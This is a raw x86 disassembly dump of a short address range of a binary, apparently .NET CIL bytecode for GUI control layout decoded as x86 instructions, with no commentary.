  402fe9:	7b 2f                	jnp    0x40301a
  402feb:	00 00                	add    %al,(%eax)
  402fed:	04 6f                	add    $0x6f,%al
  402fef:	8a 00                	mov    (%eax),%al
  402ff1:	00 0a                	add    %cl,(%edx)
  402ff3:	17                   	pop    %ss
  402ff4:	73 8b                	jae    0x402f81
  402ff6:	00 00                	add    %al,(%eax)
  402ff8:	0a 6f 8c             	or     -0x74(%edi),%ch
  402ffb:	00 00                	add    %al,(%eax)
  402ffd:	0a 03                	or     (%ebx),%al
  402fff:	7b 2f                	jnp    0x403030
  403001:	00 00                	add    %al,(%eax)
  403003:	04 72                	add    $0x72,%al
  403005:	01 00                	add    %eax,(%eax)
  403007:	00 70 6f             	add    %dh,0x6f(%eax)
  40300a:	32 00                	xor    (%eax),%al
  40300c:	00 0a                	add    %cl,(%edx)
  40300e:	02 28                	add    (%eax),%ch
  403010:	3b 00                	cmp    (%eax),%eax
  403012:	00 0a                	add    %cl,(%edx)
  403014:	03 7b 2f             	add    0x2f(%ebx),%edi
  403017:	00 00                	add    %al,(%eax)
  403019:	04 6f                	add    $0x6f,%al
  40301b:	3c 00                	cmp    $0x0,%al
  40301d:	00 0a                	add    %cl,(%edx)
  40301f:	03 73 2f             	add    0x2f(%ebx),%esi
  403022:	00 00                	add    %al,(%eax)
  403024:	0a 7d 30             	or     0x30(%ebp),%bh
  403027:	00 00                	add    %al,(%eax)
  403029:	04 03                	add    $0x3,%al
  40302b:	7b 30                	jnp    0x40305d
  40302d:	00 00                	add    %al,(%eax)
  40302f:	04 1f                	add    $0x1f,%al
  403031:	19 6f 88             	sbb    %ebp,-0x78(%edi)
  403034:	00 00                	add    %al,(%eax)
  403036:	0a 03                	or     (%ebx),%al
  403038:	7b 30                	jnp    0x40306a
  40303a:	00 00                	add    %al,(%eax)
  40303c:	04 1f                	add    $0x1f,%al
  40303e:	68 04 5a 1f 1a       	push   $0x1a1f5a04
  403043:	58                   	pop    %eax
  403044:	6f                   	outsl  %ds:(%esi),(%dx)
  403045:	89 00                	mov    %eax,(%eax)
  403047:	00 0a                	add    %cl,(%edx)
  403049:	03 7b 30             	add    0x30(%ebx),%edi
  40304c:	00 00                	add    %al,(%eax)
  40304e:	04 20                	add    $0x20,%al
  403050:	f8                   	clc
  403051:	02 00                	add    (%eax),%al
  403053:	00 6f 5c             	add    %ch,0x5c(%edi)
  403056:	00 00                	add    %al,(%eax)
  403058:	0a 03                	or     (%ebx),%al
  40305a:	7b 30                	jnp    0x40308c
  40305c:	00 00                	add    %al,(%eax)
  40305e:	04 1f                	add    $0x1f,%al
  403060:	10 6f 5b             	adc    %ch,0x5b(%edi)
  403063:	00 00                	add    %al,(%eax)
  403065:	0a 03                	or     (%ebx),%al
  403067:	7b 30                	jnp    0x403099
  403069:	00 00                	add    %al,(%eax)
  40306b:	04 72                	add    $0x72,%al
  40306d:	01 00                	add    %eax,(%eax)
  40306f:	00 70 6f             	add    %dh,0x6f(%eax)
  403072:	32 00                	xor    (%eax),%al
  403074:	00 0a                	add    %cl,(%edx)
  403076:	02 28                	add    (%eax),%ch
  403078:	3b 00                	cmp    (%eax),%eax
  40307a:	00 0a                	add    %cl,(%edx)
  40307c:	03 7b 30             	add    0x30(%ebx),%edi
  40307f:	00 00                	add    %al,(%eax)
  403081:	04 6f                	add    $0x6f,%al
  403083:	3c 00                	cmp    $0x0,%al
  403085:	00 0a                	add    %cl,(%edx)
  403087:	03 73 8d             	add    -0x73(%ebx),%esi
  40308a:	00 00                	add    %al,(%eax)
  40308c:	0a 7d 31             	or     0x31(%ebp),%bh
  40308f:	00 00                	add    %al,(%eax)
  403091:	04 03                	add    $0x3,%al
  403093:	7b 31                	jnp    0x4030c6
  403095:	00 00                	add    %al,(%eax)
  403097:	04 16                	add    $0x16,%al
  403099:	6f                   	outsl  %ds:(%esi),(%dx)
  40309a:	86 00                	xchg   %al,(%eax)
  40309c:	00 0a                	add    %cl,(%edx)
  40309e:	03 7b 31             	add    0x31(%ebx),%edi
  4030a1:	00 00                	add    %al,(%eax)
  4030a3:	04 16                	add    $0x16,%al
  4030a5:	6f                   	outsl  %ds:(%esi),(%dx)
  4030a6:	8e 00                	mov    (%eax),%es
  4030a8:	00 0a                	add    %cl,(%edx)
  4030aa:	03 7b 31             	add    0x31(%ebx),%edi
  4030ad:	00 00                	add    %al,(%eax)
  4030af:	04 02                	add    $0x2,%al
  4030b1:	02 7b 29             	add    0x29(%ebx),%bh
  4030b4:	00 00                	add    %al,(%eax)
  4030b6:	04 28                	add    $0x28,%al
  4030b8:	2c 00                	sub    $0x0,%al
  4030ba:	00 06                	add    %al,(%esi)
  4030bc:	6f                   	outsl  %ds:(%esi),(%dx)
  4030bd:	8f 00                	pop    (%eax)
  4030bf:	00 0a                	add    %cl,(%edx)
  4030c1:	03 7b 36             	add    0x36(%ebx),%edi
  4030c4:	00 00                	add    %al,(%eax)
  4030c6:	04 1f                	add    $0x1f,%al
  4030c8:	0f 2f 3a             	comiss (%edx),%xmm7
  4030cb:	03 7b 31             	add    0x31(%ebx),%edi
  4030ce:	00 00                	add    %al,(%eax)
  4030d0:	04 20                	add    $0x20,%al
  4030d2:	e4 02                	in     $0x2,%al
  4030d4:	00 00                	add    %al,(%eax)
  4030d6:	1f                   	pop    %ds
  4030d7:	1e                   	push   %ds
  4030d8:	03 7b 36             	add    0x36(%ebx),%edi
  4030db:	00 00                	add    %al,(%eax)
  4030dd:	04 5a                	add    $0x5a,%al
  4030df:	59                   	pop    %ecx
  4030e0:	1f                   	pop    %ds
  4030e1:	14 73                	adc    $0x73,%al
  4030e3:	38 00                	cmp    %al,(%eax)
  4030e5:	00 0a                	add    %cl,(%edx)
  4030e7:	6f                   	outsl  %ds:(%esi),(%dx)
  4030e8:	90                   	nop
  4030e9:	00 00                	add    %al,(%eax)
  4030eb:	0a 03                	or     (%ebx),%al
  4030ed:	7b 31                	jnp    0x403120
  4030ef:	00 00                	add    %al,(%eax)
  4030f1:	04 1f                	add    $0x1f,%al
  4030f3:	19 1f                	sbb    %ebx,(%edi)
  4030f5:	1e                   	push   %ds
  4030f6:	03 7b 36             	add    0x36(%ebx),%edi
  4030f9:	00 00                	add    %al,(%eax)
  4030fb:	04 5a                	add    $0x5a,%al
  4030fd:	58                   	pop    %eax
  4030fe:	6f                   	outsl  %ds:(%esi),(%dx)
  4030ff:	88 00                	mov    %al,(%eax)
  403101:	00 0a                	add    %cl,(%edx)
  403103:	2b 27                	sub    (%edi),%esp
  403105:	03 7b 31             	add    0x31(%ebx),%edi
  403108:	00 00                	add    %al,(%eax)
  40310a:	04 20                	add    $0x20,%al
  40310c:	22 01                	and    (%ecx),%al
  40310e:	00 00                	add    %al,(%eax)
  403110:	1f                   	pop    %ds
  403111:	14 73                	adc    $0x73,%al
  403113:	38 00                	cmp    %al,(%eax)
  403115:	00 0a                	add    %cl,(%edx)
  403117:	6f                   	outsl  %ds:(%esi),(%dx)
  403118:	90                   	nop
  403119:	00 00                	add    %al,(%eax)
  40311b:	0a 03                	or     (%ebx),%al
  40311d:	7b 31                	jnp    0x403150
  40311f:	00 00                	add    %al,(%eax)
  403121:	04 20                	add    $0x20,%al
  403123:	db 01                	fildl  (%ecx)
  403125:	00 00                	add    %al,(%eax)
  403127:	6f                   	outsl  %ds:(%esi),(%dx)
  403128:	88 00                	mov    %al,(%eax)
  40312a:	00 0a                	add    %cl,(%edx)
  40312c:	03 7b 31             	add    0x31(%ebx),%edi
  40312f:	00 00                	add    %al,(%eax)
  403131:	04 1f                	add    $0x1f,%al
  403133:	68 04 5a 1f 2f       	push   $0x2f1f5a04
  403138:	58                   	pop    %eax
  403139:	6f                   	outsl  %ds:(%esi),(%dx)
  40313a:	89 00                	mov    %eax,(%eax)
  40313c:	00 0a                	add    %cl,(%edx)
  40313e:	02 28                	add    (%eax),%ch
  403140:	3b 00                	cmp    (%eax),%eax
  403142:	00 0a                	add    %cl,(%edx)
  403144:	03 7b 31             	add    0x31(%ebx),%edi
  403147:	00 00                	add    %al,(%eax)
  403149:	04 6f                	add    $0x6f,%al
  40314b:	3c 00                	cmp    $0x0,%al
  40314d:	00 0a                	add    %cl,(%edx)
  40314f:	03 73 2f             	add    0x2f(%ebx),%esi
  403152:	00 00                	add    %al,(%eax)
  403154:	0a 7d 32             	or     0x32(%ebp),%bh
  403157:	00 00                	add    %al,(%eax)
  403159:	04 03                	add    $0x3,%al
  40315b:	7b 32                	jnp    0x40318f
  40315d:	00 00                	add    %al,(%eax)
  40315f:	04 1b                	add    $0x1b,%al
  403161:	6f                   	outsl  %ds:(%esi),(%dx)
  403162:	88 00                	mov    %al,(%eax)
  403164:	00 0a                	add    %cl,(%edx)
  403166:	03 7b 32             	add    0x32(%ebx),%edi
  403169:	00 00                	add    %al,(%eax)
  40316b:	04 1f                	add    $0x1f,%al
  40316d:	68 04 5a 1f 48       	push   $0x481f5a04
  403172:	58                   	pop    %eax
  403173:	6f                   	outsl  %ds:(%esi),(%dx)
  403174:	89 00                	mov    %eax,(%eax)
  403176:	00 0a                	add    %cl,(%edx)
  403178:	03 7b 32             	add    0x32(%ebx),%edi
  40317b:	00 00                	add    %al,(%eax)
  40317d:	04 20                	add    $0x20,%al
  40317f:	0c 03                	or     $0x3,%al
  403181:	00 00                	add    %al,(%eax)
  403183:	6f                   	outsl  %ds:(%esi),(%dx)
  403184:	5c                   	pop    %esp
  403185:	00 00                	add    %al,(%eax)
  403187:	0a 03                	or     (%ebx),%al
  403189:	7b 32                	jnp    0x4031bd
  40318b:	00 00                	add    %al,(%eax)
  40318d:	04 1f                	add    $0x1f,%al
  40318f:	10 6f 5b             	adc    %ch,0x5b(%edi)
  403192:	00 00                	add    %al,(%eax)
  403194:	0a 03                	or     (%ebx),%al
  403196:	7b 32                	jnp    0x4031ca
  403198:	00 00                	add    %al,(%eax)
  40319a:	04 72                	add    $0x72,%al
  40319c:	01 00                	add    %eax,(%eax)
  40319e:	00 70 6f             	add    %dh,0x6f(%eax)
  4031a1:	32 00                	xor    (%eax),%al
  4031a3:	00 0a                	add    %cl,(%edx)
  4031a5:	02 28                	add    (%eax),%ch
  4031a7:	3b 00                	cmp    (%eax),%eax
  4031a9:	00 0a                	add    %cl,(%edx)
  4031ab:	03 7b 32             	add    0x32(%ebx),%edi
  4031ae:	00 00                	add    %al,(%eax)
  4031b0:	04 6f                	add    $0x6f,%al
  4031b2:	3c 00                	cmp    $0x0,%al
  4031b4:	00 0a                	add    %cl,(%edx)
  4031b6:	03 73 2f             	add    0x2f(%ebx),%esi
  4031b9:	00 00                	add    %al,(%eax)
  4031bb:	0a 7d 33             	or     0x33(%ebp),%bh
  4031be:	00 00                	add    %al,(%eax)
  4031c0:	04 03                	add    $0x3,%al
  4031c2:	7b 33                	jnp    0x4031f7
  4031c4:	00 00                	add    %al,(%eax)
  4031c6:	04 1f                	add    $0x1f,%al
  4031c8:	19 6f 88             	sbb    %ebp,-0x78(%edi)
  4031cb:	00 00                	add    %al,(%eax)
  4031cd:	0a 03                	or     (%ebx),%al
  4031cf:	7b 33                	jnp    0x403204
  4031d1:	00 00                	add    %al,(%eax)
  4031d3:	04 1f                	add    $0x1f,%al
  4031d5:	68 04 5a 1f 58       	push   $0x581f5a04
  4031da:	58                   	pop    %eax
  4031db:	6f                   	outsl  %ds:(%esi),(%dx)
  4031dc:	89 00                	mov    %eax,(%eax)
  4031de:	00 0a                	add    %cl,(%edx)
  4031e0:	03 7b 33             	add    0x33(%ebx),%edi
  4031e3:	00 00                	add    %al,(%eax)
  4031e5:	04 20                	add    $0x20,%al
  4031e7:	f8                   	clc
  4031e8:	02 00                	add    (%eax),%al
  4031ea:	00 6f 5c             	add    %ch,0x5c(%edi)
  4031ed:	00 00                	add    %al,(%eax)
  4031ef:	0a 03                	or     (%ebx),%al
  4031f1:	7b 33                	jnp    0x403226
  4031f3:	00 00                	add    %al,(%eax)
  4031f5:	04 1f                	add    $0x1f,%al
  4031f7:	10 6f 5b             	adc    %ch,0x5b(%edi)
  4031fa:	00 00                	add    %al,(%eax)
  4031fc:	0a 03                	or     (%ebx),%al
  4031fe:	7b 33                	jnp    0x403233
  403200:	00 00                	add    %al,(%eax)
  403202:	04 72                	add    $0x72,%al
  403204:	01 00                	add    %eax,(%eax)
  403206:	00 70 6f             	add    %dh,0x6f(%eax)
  403209:	32 00                	xor    (%eax),%al
  40320b:	00 0a                	add    %cl,(%edx)
  40320d:	02 28                	add    (%eax),%ch
  40320f:	3b 00                	cmp    (%eax),%eax
  403211:	00 0a                	add    %cl,(%edx)
  403213:	03 7b 33             	add    0x33(%ebx),%edi
  403216:	00 00                	add    %al,(%eax)
  403218:	04 6f                	add    $0x6f,%al
  40321a:	3c 00                	cmp    $0x0,%al
  40321c:	00 0a                	add    %cl,(%edx)
  40321e:	2a 32                	sub    (%edx),%dh
  403220:	02 7b 2e             	add    0x2e(%ebx),%bh
  403223:	00 00                	add    %al,(%eax)
  403225:	04 6f                	add    $0x6f,%al
  403227:	91                   	xchg   %eax,%ecx
  403228:	00 00                	add    %al,(%eax)
  40322a:	0a 2a                	or     (%edx),%ch
  40322c:	e2 02                	loop   0x403230
  40322e:	19 7d 29             	sbb    %edi,0x29(%ebp)
  403231:	00 00                	add    %al,(%eax)
  403233:	04 02                	add    $0x2,%al
  403235:	73 92                	jae    0x4031c9
  403237:	00 00                	add    %al,(%eax)
  403239:	0a 7d 2a             	or     0x2a(%ebp),%bh
  40323c:	00 00                	add    %al,(%eax)
  40323e:	04 02                	add    $0x2,%al
  403240:	15 7d 2b 00 00       	adc    $0x2b7d,%eax
  403245:	04 02                	add    $0x2,%al
  403247:	15 7d 2c 00 00       	adc    $0x2c7d,%eax
  40324c:	04 02                	add    $0x2,%al
  40324e:	73 93                	jae    0x4031e3
  403250:	00 00                	add    %al,(%eax)
  403252:	0a 7d 2e             	or     0x2e(%ebp),%bh
  403255:	00 00                	add    %al,(%eax)
  403257:	04 02                	add    $0x2,%al
  403259:	28 1a                	sub    %bl,(%edx)
  40325b:	00 00                	add    %al,(%eax)
  40325d:	0a 02                	or     (%edx),%al
  40325f:	28 2d 00 00 06 2a    	sub    %ch,0x2a060000
  403265:	fe 02                	incb   (%edx)
  403267:	19 7d 29             	sbb    %edi,0x29(%ebp)
  40326a:	00 00                	add    %al,(%eax)
  40326c:	04 02                	add    $0x2,%al
  40326e:	73 92                	jae    0x403202
  403270:	00 00                	add    %al,(%eax)
  403272:	0a 7d 2a             	or     0x2a(%ebp),%bh
  403275:	00 00                	add    %al,(%eax)
  403277:	04 02                	add    $0x2,%al
  403279:	15 7d 2b 00 00       	adc    $0x2b7d,%eax
  40327e:	04 02                	add    $0x2,%al
  403280:	15 7d 2c 00 00       	adc    $0x2c7d,%eax
  403285:	04 02                	add    $0x2,%al
  403287:	73 93                	jae    0x40321c
  403289:	00 00                	add    %al,(%eax)
  40328b:	0a 7d 2e             	or     0x2e(%ebp),%bh
  40328e:	00 00                	add    %al,(%eax)
  403290:	04 02                	add    $0x2,%al
  403292:	28 1a                	sub    %bl,(%edx)
  403294:	00 00                	add    %al,(%eax)
  403296:	0a 02                	or     (%edx),%al
  403298:	03 7d 29             	add    0x29(%ebp),%edi
  40329b:	00 00                	add    %al,(%eax)
  40329d:	04 02                	add    $0x2,%al
  40329f:	28 2d 00 00 06 2a    	sub    %ch,0x2a060000
  4032a5:	00 00                	add    %al,(%eax)
  4032a7:	00 13                	add    %dl,(%ebx)
  4032a9:	30 06                	xor    %al,(%esi)
  4032ab:	00 3a                	add    %bh,(%edx)
  4032ad:	08 00                	or     %al,(%eax)
  4032af:	00 0a                	add    %cl,(%edx)
  4032b1:	00 00                	add    %al,(%eax)
  4032b3:	11 03                	adc    %eax,(%ebx)
  4032b5:	2d 01 2a 15 0a       	sub    $0xa152a01,%eax
  4032ba:	16                   	push   %ss
  4032bb:	0b 2b                	or     (%ebx),%ebp
  4032bd:	21 02                	and    %eax,(%edx)
  4032bf:	7b 2e                	jnp    0x4032ef
  4032c1:	00 00                	add    %al,(%eax)
  4032c3:	04 07                	add    $0x7,%al
  4032c5:	6f                   	outsl  %ds:(%esi),(%dx)
  4032c6:	85 00                	test   %eax,(%eax)
  4032c8:	00 0a                	add    %cl,(%edx)
  4032ca:	7b 34                	jnp    0x403300
  4032cc:	00 00                	add    %al,(%eax)
  4032ce:	04 03                	add    $0x3,%al
  4032d0:	6f                   	outsl  %ds:(%esi),(%dx)
  4032d1:	94                   	xchg   %eax,%esp
  4032d2:	00 00                	add    %al,(%eax)
  4032d4:	0a 33                	or     (%ebx),%dh
  4032d6:	04 07                	add    $0x7,%al
  4032d8:	0a 2b                	or     (%ebx),%ch
  4032da:	12 07                	adc    (%edi),%al
  4032dc:	17                   	pop    %ss
  4032dd:	58                   	pop    %eax
  4032de:	0b 07                	or     (%edi),%eax
  4032e0:	02 7b 2e             	add    0x2e(%ebx),%bh
  4032e3:	00 00                	add    %al,(%eax)
  4032e5:	04 6f                	add    $0x6f,%al
  4032e7:	91                   	xchg   %eax,%ecx
  4032e8:	00 00                	add    %al,(%eax)
  4032ea:	0a 32                	or     (%edx),%dh
  4032ec:	d1 03                	roll   $1,(%ebx)
  4032ee:	6f                   	outsl  %ds:(%esi),(%dx)
  4032ef:	95                   	xchg   %eax,%ebp
  4032f0:	00 00                	add    %al,(%eax)
  4032f2:	0a 17                	or     (%edi),%dl
  4032f4:	40                   	inc    %eax
  4032f5:	c1 02 00             	roll   $0x0,(%edx)
  4032f8:	00 06                	add    %al,(%esi)
  4032fa:	16                   	push   %ss
  4032fb:	3f                   	aas
  4032fc:	16                   	push   %ss
  4032fd:	01 00                	add    %eax,(%eax)
  4032ff:	00 02                	add    %al,(%edx)
  403301:	7b 2b                	jnp    0x40332e
  403303:	00 00                	add    %al,(%eax)
  403305:	04 06                	add    $0x6,%al
  403307:	33 07                	xor    (%edi),%eax
  403309:	02 15 7d 2b 00 00    	add    0x2b7d,%dl
  40330f:	04 02                	add    $0x2,%al
  403311:	28 3b                	sub    %bh,(%ebx)
  403313:	00 00                	add    %al,(%eax)
  403315:	0a 02                	or     (%edx),%al
  403317:	7b 2e                	jnp    0x403347
  403319:	00 00                	add    %al,(%eax)
  40331b:	04 06                	add    $0x6,%al
  40331d:	6f                   	outsl  %ds:(%esi),(%dx)
  40331e:	85 00                	test   %eax,(%eax)
  403320:	00 0a                	add    %cl,(%edx)
  403322:	7b 2f                	jnp    0x403353
  403324:	00 00                	add    %al,(%eax)
  403326:	04 6f                	add    $0x6f,%al
  403328:	96                   	xchg   %eax,%esi
  403329:	00 00                	add    %al,(%eax)
  40332b:	0a 02                	or     (%edx),%al
  40332d:	28 3b                	sub    %bh,(%ebx)
  40332f:	00 00                	add    %al,(%eax)
  403331:	0a 02                	or     (%edx),%al
  403333:	7b 2e                	jnp    0x403363
  403335:	00 00                	add    %al,(%eax)
  403337:	04 06                	add    $0x6,%al
  403339:	6f                   	outsl  %ds:(%esi),(%dx)
  40333a:	85 00                	test   %eax,(%eax)
  40333c:	00 0a                	add    %cl,(%edx)
  40333e:	7b 30                	jnp    0x403370
  403340:	00 00                	add    %al,(%eax)
  403342:	04 6f                	add    $0x6f,%al
  403344:	96                   	xchg   %eax,%esi
  403345:	00 00                	add    %al,(%eax)
  403347:	0a 02                	or     (%edx),%al
  403349:	28 3b                	sub    %bh,(%ebx)
  40334b:	00 00                	add    %al,(%eax)
  40334d:	0a 02                	or     (%edx),%al
  40334f:	7b 2e                	jnp    0x40337f
  403351:	00 00                	add    %al,(%eax)
  403353:	04 06                	add    $0x6,%al
  403355:	6f                   	outsl  %ds:(%esi),(%dx)
  403356:	85 00                	test   %eax,(%eax)
  403358:	00 0a                	add    %cl,(%edx)
  40335a:	7b 31                	jnp    0x40338d
  40335c:	00 00                	add    %al,(%eax)
  40335e:	04 6f                	add    $0x6f,%al
  403360:	96                   	xchg   %eax,%esi
  403361:	00 00                	add    %al,(%eax)
  403363:	0a 02                	or     (%edx),%al
  403365:	28 3b                	sub    %bh,(%ebx)
  403367:	00 00                	add    %al,(%eax)
  403369:	0a 02                	or     (%edx),%al
  40336b:	7b 2e                	jnp    0x40339b
  40336d:	00 00                	add    %al,(%eax)
  40336f:	04 06                	add    $0x6,%al
  403371:	6f                   	outsl  %ds:(%esi),(%dx)
  403372:	85 00                	test   %eax,(%eax)
  403374:	00 0a                	add    %cl,(%edx)
  403376:	7b 32                	jnp    0x4033aa
  403378:	00 00                	add    %al,(%eax)
  40337a:	04 6f                	add    $0x6f,%al
  40337c:	96                   	xchg   %eax,%esi
  40337d:	00 00                	add    %al,(%eax)
  40337f:	0a 02                	or     (%edx),%al
  403381:	28 3b                	sub    %bh,(%ebx)
  403383:	00 00                	add    %al,(%eax)
  403385:	0a 02                	or     (%edx),%al
  403387:	7b 2e                	jnp    0x4033b7
  403389:	00 00                	add    %al,(%eax)
  40338b:	04 06                	add    $0x6,%al
  40338d:	6f                   	outsl  %ds:(%esi),(%dx)
  40338e:	85 00                	test   %eax,(%eax)
  403390:	00 0a                	add    %cl,(%edx)
  403392:	7b 33                	jnp    0x4033c7
  403394:	00 00                	add    %al,(%eax)
  403396:	04 6f                	add    $0x6f,%al
  403398:	96                   	xchg   %eax,%esi
  403399:	00 00                	add    %al,(%eax)
  40339b:	0a 02                	or     (%edx),%al
  40339d:	7b 2e                	jnp    0x4033cd
  40339f:	00 00                	add    %al,(%eax)
  4033a1:	04 06                	add    $0x6,%al
  4033a3:	6f                   	outsl  %ds:(%esi),(%dx)
  4033a4:	85 00                	test   %eax,(%eax)
  4033a6:	00 0a                	add    %cl,(%edx)
  4033a8:	7b 2f                	jnp    0x4033d9
  4033aa:	00 00                	add    %al,(%eax)
  4033ac:	04 6f                	add    $0x6f,%al
  4033ae:	97                   	xchg   %eax,%edi
  4033af:	00 00                	add    %al,(%eax)
  4033b1:	0a 02                	or     (%edx),%al
  4033b3:	7b 2e                	jnp    0x4033e3
  4033b5:	00 00                	add    %al,(%eax)
  4033b7:	04 06                	add    $0x6,%al
  4033b9:	6f                   	outsl  %ds:(%esi),(%dx)
  4033ba:	85 00                	test   %eax,(%eax)
  4033bc:	00 0a                	add    %cl,(%edx)
  4033be:	7b 30                	jnp    0x4033f0
  4033c0:	00 00                	add    %al,(%eax)
  4033c2:	04 6f                	add    $0x6f,%al
  4033c4:	97                   	xchg   %eax,%edi
  4033c5:	00 00                	add    %al,(%eax)
  4033c7:	0a 02                	or     (%edx),%al
  4033c9:	7b 2e                	jnp    0x4033f9
  4033cb:	00 00                	add    %al,(%eax)
  4033cd:	04 06                	add    $0x6,%al
  4033cf:	6f                   	outsl  %ds:(%esi),(%dx)
  4033d0:	85 00                	test   %eax,(%eax)
  4033d2:	00 0a                	add    %cl,(%edx)
  4033d4:	7b 31                	jnp    0x403407
  4033d6:	00 00                	add    %al,(%eax)
  4033d8:	04 6f                	add    $0x6f,%al
  4033da:	97                   	xchg   %eax,%edi
  4033db:	00 00                	add    %al,(%eax)
  4033dd:	0a 02                	or     (%edx),%al
  4033df:	7b 2e                	jnp    0x40340f
  4033e1:	00 00                	add    %al,(%eax)
  4033e3:	04 06                	add    $0x6,%al
  4033e5:	6f                   	outsl  %ds:(%esi),(%dx)
  4033e6:	85 00                	test   %eax,(%eax)
  4033e8:	00 0a                	add    %cl,(%edx)
  4033ea:	7b 32                	jnp    0x40341e
  4033ec:	00 00                	add    %al,(%eax)
  4033ee:	04 6f                	add    $0x6f,%al
  4033f0:	97                   	xchg   %eax,%edi
  4033f1:	00 00                	add    %al,(%eax)
  4033f3:	0a 02                	or     (%edx),%al
  4033f5:	7b 2e                	jnp    0x403425
  4033f7:	00 00                	add    %al,(%eax)
  4033f9:	04 06                	add    $0x6,%al
  4033fb:	6f                   	outsl  %ds:(%esi),(%dx)
  4033fc:	85 00                	test   %eax,(%eax)
  4033fe:	00 0a                	add    %cl,(%edx)
  403400:	7b 33                	jnp    0x403435
  403402:	00 00                	add    %al,(%eax)
  403404:	04 6f                	add    $0x6f,%al
  403406:	97                   	xchg   %eax,%edi
  403407:	00 00                	add    %al,(%eax)
  403409:	0a 02                	or     (%edx),%al
  40340b:	7b 2e                	jnp    0x40343b
  40340d:	00 00                	add    %al,(%eax)
  40340f:	04 06                	add    $0x6,%al
  403411:	6f                   	outsl  %ds:(%esi),(%dx)
  403412:	98                   	cwtl
  403413:	00 00                	add    %al,(%eax)
  403415:	0a 02                	or     (%edx),%al
  403417:	7b 2e                	jnp    0x403447
  403419:	00 00                	add    %al,(%eax)
  40341b:	04 6f                	add    $0x6f,%al
  40341d:	91                   	xchg   %eax,%ecx
  40341e:	00 00                	add    %al,(%eax)
  403420:	0a 2d 1d 02 7b 2a    	or     0x2a7b021d,%ch
  403426:	00 00                	add    %al,(%eax)
  403428:	04 6f                	add    $0x6f,%al
  40342a:	99                   	cltd
  40342b:	00 00                	add    %al,(%eax)
  40342d:	0a 02                	or     (%edx),%al
  40342f:	7b 2a                	jnp    0x40345b
  403431:	00 00                	add    %al,(%eax)
  403433:	04 6f                	add    $0x6f,%al
  403435:	97                   	xchg   %eax,%edi
  403436:	00 00                	add    %al,(%eax)
  403438:	0a 02                	or     (%edx),%al
  40343a:	28 19                	sub    %bl,(%ecx)
  40343c:	00 00                	add    %al,(%eax)
  40343e:	0a 2a                	or     (%edx),%ch
  403440:	06                   	push   %es
  403441:	16                   	push   %ss
  403442:	2f                   	das
  403443:	01 2a                	add    %ebp,(%edx)
  403445:	06                   	push   %es
  403446:	0c 38                	or     $0x38,%al
  403448:	95                   	xchg   %eax,%ebp
  403449:	00 00                	add    %al,(%eax)
  40344b:	00 02                	add    %al,(%edx)
  40344d:	7b 2e                	jnp    0x40347d
  40344f:	00 00                	add    %al,(%eax)
  403451:	04 08                	add    $0x8,%al
  403453:	6f                   	outsl  %ds:(%esi),(%dx)
  403454:	85 00                	test   %eax,(%eax)
  403456:	00 0a                	add    %cl,(%edx)
  403458:	7b 2f                	jnp    0x403489
  40345a:	00 00                	add    %al,(%eax)
  40345c:	04 1f                	add    $0x1f,%al
  40345e:	68 08 5a 1f 0a       	push   $0xa1f5a08
  403463:	58                   	pop    %eax
  403464:	6f                   	outsl  %ds:(%esi),(%dx)
  403465:	89 00                	mov    %eax,(%eax)
  403467:	00 0a                	add    %cl,(%edx)
  403469:	02 7b 2e             	add    0x2e(%ebx),%bh
  40346c:	00 00                	add    %al,(%eax)
  40346e:	04 08                	add    $0x8,%al
  403470:	6f                   	outsl  %ds:(%esi),(%dx)
  403471:	85 00                	test   %eax,(%eax)
  403473:	00 0a                	add    %cl,(%edx)
  403475:	7b 30                	jnp    0x4034a7
  403477:	00 00                	add    %al,(%eax)
  403479:	04 1f                	add    $0x1f,%al
  40347b:	68 08 5a 1f 1a       	push   $0x1a1f5a08
  403480:	58                   	pop    %eax
  403481:	6f                   	outsl  %ds:(%esi),(%dx)
  403482:	89 00                	mov    %eax,(%eax)
  403484:	00 0a                	add    %cl,(%edx)
  403486:	02 7b 2e             	add    0x2e(%ebx),%bh
  403489:	00 00                	add    %al,(%eax)
  40348b:	04 08                	add    $0x8,%al
  40348d:	6f                   	outsl  %ds:(%esi),(%dx)
  40348e:	85 00                	test   %eax,(%eax)
  403490:	00 0a                	add    %cl,(%edx)
  403492:	7b 31                	jnp    0x4034c5
  403494:	00 00                	add    %al,(%eax)
  403496:	04 1f                	add    $0x1f,%al
  403498:	68 08 5a 1f 2f       	push   $0x2f1f5a08
  40349d:	58                   	pop    %eax
  40349e:	6f                   	outsl  %ds:(%esi),(%dx)
  40349f:	89 00                	mov    %eax,(%eax)
  4034a1:	00 0a                	add    %cl,(%edx)
  4034a3:	02 7b 2e             	add    0x2e(%ebx),%bh
  4034a6:	00 00                	add    %al,(%eax)
  4034a8:	04 08                	add    $0x8,%al
  4034aa:	6f                   	outsl  %ds:(%esi),(%dx)
  4034ab:	85 00                	test   %eax,(%eax)
  4034ad:	00 0a                	add    %cl,(%edx)
  4034af:	7b 32                	jnp    0x4034e3
  4034b1:	00 00                	add    %al,(%eax)
  4034b3:	04 1f                	add    $0x1f,%al
  4034b5:	68 08 5a 1f 48       	push   $0x481f5a08
  4034ba:	58                   	pop    %eax
  4034bb:	6f                   	outsl  %ds:(%esi),(%dx)
  4034bc:	89 00                	mov    %eax,(%eax)
  4034be:	00 0a                	add    %cl,(%edx)
  4034c0:	02 7b 2e             	add    0x2e(%ebx),%bh
  4034c3:	00 00                	add    %al,(%eax)
  4034c5:	04 08                	add    $0x8,%al
  4034c7:	6f                   	outsl  %ds:(%esi),(%dx)
  4034c8:	85 00                	test   %eax,(%eax)
  4034ca:	00 0a                	add    %cl,(%edx)
  4034cc:	7b 33                	jnp    0x403501
  4034ce:	00 00                	add    %al,(%eax)
  4034d0:	04 1f                	add    $0x1f,%al
  4034d2:	68 08 5a 1f 58       	push   $0x581f5a08
  4034d7:	58                   	pop    %eax
  4034d8:	6f                   	outsl  %ds:(%esi),(%dx)
  4034d9:	89 00                	mov    %eax,(%eax)
  4034db:	00 0a                	add    %cl,(%edx)
  4034dd:	08 17                	or     %dl,(%edi)
  4034df:	58                   	pop    %eax
  4034e0:	0c 08                	or     $0x8,%al
  4034e2:	02 7b 2e             	add    0x2e(%ebx),%bh
  4034e5:	00 00                	add    %al,(%eax)
  4034e7:	04 6f                	add    $0x6f,%al
  4034e9:	91                   	xchg   %eax,%ecx
  4034ea:	00 00                	add    %al,(%eax)
  4034ec:	0a 3f                	or     (%edi),%bh
  4034ee:	5a                   	pop    %edx
  4034ef:	ff                   	(bad)
  4034f0:	ff                   	(bad)
  4034f1:	ff 1f                	lcall  *(%edi)
  4034f3:	68 02 7b 2e 00       	push   $0x2e7b02
